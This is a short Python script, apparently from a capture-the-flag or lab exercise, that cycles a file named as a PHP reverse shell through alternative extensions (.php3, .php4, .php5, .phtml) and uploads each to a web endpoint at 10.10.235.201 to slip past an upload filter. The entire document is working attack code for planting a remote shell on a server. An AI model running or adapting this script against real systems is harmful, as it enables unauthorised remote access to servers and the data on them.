import requests

import os

old_filename = "reverse-shell-php.php"
url = "http://10.10.235.201:3333/internal/index.php"

filename = "reverse-shell-php"
extensions = ['.php3', '.php4', '.php5', '.phtml']

for ext in extensions:
	new_filename = filename + ext
	os.replace(old_filename, new_filename)
	files = {'file' : open(new_filename, "rb")}
	response = requests.post(url, files=files)
	print(response.text)
	old_filename = new_filename
